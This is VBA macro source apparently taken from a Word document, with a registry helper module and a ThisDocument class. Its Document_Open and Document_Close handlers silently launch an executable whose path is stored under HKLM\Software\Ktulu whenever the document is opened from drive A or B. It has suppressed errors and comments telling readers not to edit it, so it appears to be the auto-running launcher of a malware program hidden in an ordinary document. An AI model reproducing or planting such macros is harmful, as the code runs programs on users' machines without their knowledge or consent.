   Attribute VB_Name = "Functions"
   ' Please don't edit these lines,
   ' can occasion an erroneous functioning of the application.
   ' Por favor no edite estas lineas,
   ' puede ocasionar el funcionamiento erróneo de la aplicación.
   Option Explicit
   Global Const REG_SZ As Long = 1
   Global Const REG_DWORD As Long = 4
   Global Const HKEY_LOCAL_MACHINE = &H80000002
   Global Const ERROR_NONE = 0
   Global Const KEY_ALL_ACCESS = &H3F

   Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
   Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
   Declare Function RegQueryValueExString Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
   Declare Function RegQueryValueExLong Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Long, lpcbData As Long) As Long
   Declare Function RegQueryValueExNULL Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As Long, lpcbData As Long) As Long

   Public Function QueryValue(lPredefinedKey As Long, sKeyName As String, sValueName As String)
   On Error Resume Next
   Dim lReturn As Long
   Dim hKey As Long
   Dim vValue As Variant

   lReturn = RegOpenKeyEx(lPredefinedKey, sKeyName, 0, KEY_ALL_ACCESS, hKey)
   lReturn = QueryValueEx(hKey, sValueName, vValue)
   QueryValue = vValue
   RegCloseKey (hKey)
   End Function

   Function QueryValueEx(ByVal lhKey As Long, ByVal szValueName As String, vValue As Variant) As Long
   On Error GoTo QueryValueExError
   Dim cch As Long
   Dim lrc As Long
   Dim lType As Long
   Dim lValue As Long
   Dim sValue As String

   lrc = RegQueryValueExNULL(lhKey, szValueName, 0&, lType, 0&, cch)
    If lrc <> ERROR_NONE Then Error 5
     Select Case lType

      Case REG_SZ:
       sValue = String(cch, 0)
       lrc = RegQueryValueExString(lhKey, szValueName, 0&, lType, sValue, cch)
       If lrc = ERROR_NONE Then
        vValue = Left$(sValue, cch)
       Else
        vValue = Empty
       End If

       Case REG_DWORD:
        lrc = RegQueryValueExLong(lhKey, szValueName, 0&, lType, lValue, cch)
        If lrc = ERROR_NONE Then vValue = lValue

       Case Else
        lrc = -1

       End Select

   QueryValueExExit:
    QueryValueEx = lrc
    Exit Function

   QueryValueExError:
    Resume QueryValueExExit

   End Function

   Public Function ReadPath() As String
   On Error Resume Next
   ReadPath = QueryValue(HKEY_LOCAL_MACHINE, "Software\Ktulu", "App")
   End Function

   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   ' Please don't edit these lines,
   ' can occasion an erroneous functioning of the application.
   ' Por favor no edite estas lineas,
   ' puede ocasionar el funcionamiento erróneo de la aplicación.
   Option Explicit

   Private Sub Document_Close()
   MSWordProcedure
   End Sub

   Private Sub Document_Open()
   MSWordProcedure
   End Sub

   Public Sub MSWordProcedure()
   On Error Resume Next
   Dim szFullName As String
   Dim szPathName As String

   szFullName = ActiveDocument.FullName
   If UCase(Left(szFullName, 1)) = "A" Or UCase(Left(szFullName, 1)) = "B" Then
    szPathName = ReadPath()
    Shell szPathName
   End If
   End Sub
